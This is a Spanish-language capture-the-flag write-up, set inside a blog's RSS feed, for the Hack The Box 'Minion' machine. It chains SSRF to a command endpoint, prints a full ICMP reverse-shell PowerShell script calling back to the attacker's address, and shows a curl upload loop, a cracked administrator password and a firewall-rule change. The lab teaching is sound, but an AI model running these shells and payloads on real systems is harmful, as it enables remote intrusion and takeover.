        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Object</guid>
        
        <category>Active Directory</category>
        
        <category>Jenkins Exploitation (New Job + Abusing Build Periodically)</category>
        
        <category>Jenkins Exploitation (Abusing Trigger builds remotely using TOKEN)</category>
        
        <category>Firewall Enumeration Techniques</category>
        
        <category>Jenkins Password Decrypt</category>
        
        <category>BloodHound Enumeration</category>
        
        <category>Abusing ForceChangePassword with PowerView</category>
        
        <category>Abusing GenericWrite (Set-DomainObject - Setting Script Logon Path)</category>
        
        <category>Abusing WriteOwner (Takeover Domain Admins Group)</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Minion - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Minion&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad insane, esta vez vamos contra una maquina potente donde a traves de un servicio &lt;code&gt;http&lt;/code&gt; vamos a aprovecharnos de un &lt;code&gt;SSRF&lt;/code&gt; para descubrir un puerto interno local que a traves de un parametro nos permitira realizar &lt;code&gt;RCE&lt;/code&gt;, pero al existir reglas de &lt;code&gt;firewall&lt;/code&gt; implementadas por &lt;code&gt;TCP&lt;/code&gt; y por &lt;code&gt;UDP&lt;/code&gt; ganaremos acceso por &lt;code&gt;ICMP&lt;/code&gt;, despues abusaremos de los permisos de un script en &lt;code&gt;powershell&lt;/code&gt; para mediante una tarea programada obtener unas contraseñas privilegiadas y finalmente manipularemos las reglas de &lt;code&gt;firewall&lt;/code&gt; para habilitarnos el acceso a los puertos internos de la maquina y poder ejecutar un &lt;code&gt;exe&lt;/code&gt; que nos permitira visualizar la root.txt como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina muy guapa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Minion
❯ ls

 Minion
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.57
PING 10.10.10.57 (10.10.10.57) 56(84) bytes of data.
64 bytes from 10.10.10.57: icmp_seq=1 ttl=127 time=194 ms

--- 10.10.10.57 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 193.546/193.546/193.546/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.57 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 17:12 -05
Initiating SYN Stealth Scan at 17:12
Scanning 10.10.10.57 [65535 ports]
Discovered open port 62696/tcp on 10.10.10.57
Completed SYN Stealth Scan at 17:13, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.57
Host is up, received user-set (0.12s latency).
Scanned at 2023-10-15 17:12:41 -05 for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
62696/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 15 (660B)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p62696 10.10.10.57 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 17:14 -05
Nmap scan report for 10.10.10.57
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/backend
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;62696&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Microsoft IIS httpd 8.5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que el puerto &lt;code&gt;62696&lt;/code&gt; corresponde a un servicio web con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de enumear las tecnolologias que utiliza y tal como nos muestra &lt;code&gt;nmap&lt;/code&gt; nos enfrentamosa un IIS.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.57:62696
http://10.10.10.57:62696 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.10.57], Microsoft-IIS[8.5], X-Powered-By[ASP.NET]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a abrir el servicio en nuestro navegador y visualizamos una pagina referente a minions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como nos enfrentamos a un &lt;code&gt;IIS&lt;/code&gt;, con &lt;code&gt;wfuzz&lt;/code&gt; podemos tratar de fuzzear archivos con extensiones &lt;code&gt;asp y aspx&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,asp-aspx -u http://10.10.10.57:62696/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.57:62696/FUZZ.FUZ2Z
Total requests: 441120

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000001221:   200        0 L      7 W        41 Ch       &quot;test - asp&quot;       
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;visualizamos la ruta &lt;code&gt;test.asp&lt;/code&gt; y observamos que nos solicita el parametro &lt;code&gt;u&lt;/code&gt; para realizar la solicitud.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Haciendo uso del parametro, podemos tratar de enviarnos una petición hacia nuestro equipo pero vemos falla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recordemos pero que tambien podemos realizar peticiones apuntando hacia la propia maquina y en efecto vemos contenido en el puerto &lt;code&gt;80&lt;/code&gt; en local.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entre las opciones que tenemos podemos ver &lt;code&gt;system commands&lt;/code&gt; y si hacemos hovering nos muestra la ruta &lt;code&gt;cmd.aspx&lt;/code&gt;, asi que podemos tratar de llegar a esta con la petición interna.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si tratamos de ejecutar un comando nos muestra un error, pero si inspeccionamos el codigo fuente vemos que necesitamos incorporar el parametro &lt;code&gt;xcmd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos nuevamente a ejecutar un comando, esta vez mandando una traza a nuestra maquina host, obtenemos un &lt;code&gt;exit status = 0&lt;/code&gt; y recibimos la petición correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:40:07.142661 IP (tos 0x0, ttl 127, id 6473, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.10.57 &amp;gt; 10.10.16.10: ICMP echo request, id 1, seq 1, length 40
17:40:07.142685 IP (tos 0x0, ttl 64, id 60344, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.16.10 &amp;gt; 10.10.10.57: ICMP echo reply, id 1, seq 1, length 40
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora que tenemos &lt;code&gt;RCE&lt;/code&gt; podemos tratar de enviarnos una &lt;code&gt;reverse shell&lt;/code&gt; a nuestra maquina, pero no va a ser posible puesto que por dentro existen reglas de firewall que evitan que ganemos acceso por &lt;code&gt;tcp&lt;/code&gt; y por &lt;code&gt;udp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pero podriamos entablarnos una &lt;code&gt;reverse shell&lt;/code&gt; por &lt;code&gt;ICMP&lt;/code&gt; ya que tenemos traza con nuestra maquina, para ello vamos a usar el script &lt;code&gt;Invoke-PowerShellIcmp.ps1&lt;/code&gt; del repositorio de &lt;code&gt;nishang&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;Invoke-PowerShellIcmp.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script &lt;code&gt;icmpsh_m.py&lt;/code&gt; que necesitamos descargar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos descargamos el archivo y ejecutamos los comandos.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py&quot;&gt;icmpsh_m.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora para evitar problemas en el script &lt;code&gt;Invoke-PowerShellIcmp.ps1&lt;/code&gt; vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final &lt;code&gt;Invoke-PowerShellIcmp -IPAddress 10.10.16.10&lt;/code&gt;, para que al interpretarse ejecute la instrucción.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d' &amp;gt; icmp.ps1
❯ cat icmp.ps1
function Invoke-PowerShellIcmp
{ 
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,
        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128
    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt; ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2&amp;gt;&amp;amp;1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;`nPS &quot; + (Get-Location).Path + '&amp;gt; ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress 10.10.16.10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que tenemos que hacer ahora es meter este script en la maquina victima, pero debemos hacerlo en un formato en la que &lt;code&gt;powershell&lt;/code&gt; lo entienda por ello usaremos &lt;code&gt;iconv&lt;/code&gt; para separ cada caracter y despues convertirlo en base64.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat icmp.ps1 | iconv -t utf-16le | base64 -w 0 &amp;gt; icmp.ps1.b64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora vamos a crear un script en &lt;code&gt;bash&lt;/code&gt; que nos ayude a automatizar la inserción de nuestro script en la maquina victima, vamos a utilizar &lt;code&gt;curl&lt;/code&gt; pero como tiene un numero limite de caracteres por linea que podemos enviar, a nuestro script &lt;code&gt;icmp.ps1.b64&lt;/code&gt; vamos a aplicarle el comando &lt;code&gt;fold&lt;/code&gt; para que tenga un numero de caracteres igual por cada linea y asi evitar problemas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat automatize.sh
#!/bin/bash

function ctrl_c(){
    echo -e &quot;\[!] Saliendo...&quot;
    tput cnorm; exit 1
}

#CTRL_C
trap ctrl_c INT

declare -r main_url=&quot;http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx&quot;

counter=0

echo; tput civis; for line in $(cat icmp.ps1.b64); do 
    command=&quot;echo $line &amp;gt;&amp;gt; C:\Temp\script.ps1&quot;

    echo -ne &quot;[+] Total de lineas enviadas [$counter/87]\r&quot;

    curl -s -X GET -G $main_url --data-urlencode &quot;xcmd=$command&quot; &amp;amp;&amp;gt;/dev/null

    let counter+=1

done; tput cnorm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar el script lo que hara sera crear el archivo &lt;code&gt;script.ps1&lt;/code&gt; en la ruta &lt;code&gt;C:\Temp\&lt;/code&gt; con el contenido del &lt;code&gt;icmp.ps1.b64&lt;/code&gt;, esto podemos verificarlo si desde el navegador le hacemos un &lt;code&gt;type&lt;/code&gt; para leerlo y nos muestra con exist status 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder ejcutarlo primero debemos transformar la data a un codigo legible por &lt;code&gt;powershell&lt;/code&gt; ya que esta se encuentra en base64, para ello usaremos los siguientes comandos ejecutados desde una powershell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;❯ pwsh
PowerShell 7.2.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

Welcome to Parrot OS 

┌[parrot@root]-[10:48-16/10]-[/home/fmiracle/machines/Minion/content]
└╼$ $fileContent = Get-Content ./icmp.ps1.b64
┌[parrot@root]-[10:51-16/10]-[/home/fmiracle/machines/Minion/content]
└╼$ $fileDecode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($fileContent))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De esta manera similar tendriamos que introducirlo en la maquina, pero aputando al archivo &lt;code&gt;script.ps1&lt;/code&gt; en la maquina victima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si leemos el nuevo archivo, vemos que lo creamos de manera existosa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora no olvidemos ejcutar los comandos que requeria el script, usare &lt;code&gt;rlwrap&lt;/code&gt; para tener un mejor manejo de la consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ sysctl -w net.ipv4.icmp_echo_ignore_all=1
❯ rlwrap python icmpsh_m.py 10.10.16.10 10.10.10.57
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que estamos en escucha solo debemos ejecutar el script y recibimos la conexión.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ rlwrap python icmpsh_m.py 10.10.16.10 10.10.10.57
Windows PowerShell running as user MINION$ on MINION
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
iis apppool\defaultapppool
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora al tratar de listar el directorio personal del usuario decoder.MINION, no tenemos acceso:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si listamos la raiz, vemos un directorio &lt;code&gt;sysadmscripts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro vemos dos archivos uno &lt;code&gt;.bat&lt;/code&gt; y un script en powershell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el &lt;code&gt;del_logs.bat&lt;/code&gt; ejecuta el &lt;code&gt;c.ps1&lt;/code&gt; y como es de borrado de logs, quiero pensar que hay una tarea programada que lo ejecuta a intervalos regulares de tiempo.&lt;/p&gt;

&lt;p&gt;Si vemos los permisos del script &lt;code&gt;c.ps1&lt;/code&gt; todos tienen privilegios full sobre este, entonces podemos tratar de manipularlo y traernos los archivos del directorio del usuario &lt;code&gt;decoder.MINION&lt;/code&gt; asumiendo que este usuario es el que realiza la ejecución de la tarea o otro con mas privilegios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos el directorio despues de unos minutos y vemos un backup.zip y la flag &lt;code&gt;user.txt&lt;/code&gt; que procederemos a leer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vemos que ademas de la flag, obtuvimos un archivo comprimido &lt;code&gt;backup.zip&lt;/code&gt;, que si bien podemos descomprimirlo no vamos a encontrar información relevante, por ello debemos pensar fuera de la caja y preguntarnos que formas existen en windows para ocultar información o metadatos.&lt;/p&gt;

&lt;p&gt;Por ello debemos tener en cuenta el concepto de los &lt;code&gt;Alternative Data Streams - ADS&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ADS: Los Flujos Alternativos de Datos, Alternate Data Streams o ADS son una característica del sistema de archivos NTFS que permite almacenar metainformación con un fichero, sin necesidad de usar un fichero separado para almacenarla.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para poder ver si hay configurados &lt;code&gt;ADS&lt;/code&gt; en una ruta, debemos ejecutar el siguiente comando:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el archivo &lt;code&gt;backup.zip&lt;/code&gt; tiene una &lt;code&gt;ADS&lt;/code&gt; pass, asi que leemos el contenido y encontramos un hash en &lt;code&gt;md5&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;type C:\Temp\backup.zip:pass
28a5d1e0c15af9f8fce7db65d75bbf17
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo crackeamos usando nuestra pagina de confianza y obtenemos una contraseña.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si bien contamos con credenciales, no podemos conectarnos con &lt;code&gt;evil-winrm&lt;/code&gt; o con &lt;code&gt;psexec&lt;/code&gt; debido a que solo vemos abierto el puerto &lt;code&gt;62696&lt;/code&gt;, pero podemos hacer uso de &lt;code&gt;PSCredential&lt;/code&gt; y ejecutar un comando a traves de &lt;code&gt;ScriptBlock&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;hostname
minion

        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 
minion\administrator
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podriamos tratar de ejecutar leer la segunda flag, vemos que antes tenemos que ejecutar el &lt;code&gt;root.exe&lt;/code&gt;, pero curiosamente no podemos hacerlo desde aqui.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
In order to get the flag you have to launch root.exe located in this folder!

        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { C:\Users\Administrator\Desktop\root.exe }
Are you trying to cheat me?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora recordemos que tenemos privilegios como administradores, asi que podemos tratar de modificar las reglas de &lt;code&gt;firewall&lt;/code&gt;, de modo que tengamos acceso a los puertos que estan abiertos internamente en la maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { New-NetFirewallRule -DisplayName fmiracle -RemoteAddress 10.10.16.10 -Direction inbound -Action allow }

Name                    : {fe96175f-38d1-451f-ad74-95e144f0d702}
ID                      : {fe96175f-38d1-451f-ad74-95e144f0d702}
Group                   : 
Platform                : {}
LSM                     : False
Profile                 : Any
PSComputerName          : localhost
RunspaceId              : 3cd818dd-a33a-4cf9-85a5-069c0144cf18
Caption                 : 
Description             : 
ElementName             : fmiracle
InstanceID              : {fe96175f-38d1-451f-ad74-95e144f0d702}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora tratamos de ver los puertos abiertos de la maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.57
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 12:50 -05
Initiating SYN Stealth Scan at 12:50
Scanning 10.10.10.57 [65535 ports]
Discovered open port 445/tcp on 10.10.10.57
Discovered open port 135/tcp on 10.10.10.57
Discovered open port 139/tcp on 10.10.10.57
Discovered open port 80/tcp on 10.10.10.57
Discovered open port 3389/tcp on 10.10.10.57
Discovered open port 49153/tcp on 10.10.10.57
Discovered open port 49154/tcp on 10.10.10.57
Discovered open port 49157/tcp on 10.10.10.57
Discovered open port 62696/tcp on 10.10.10.57
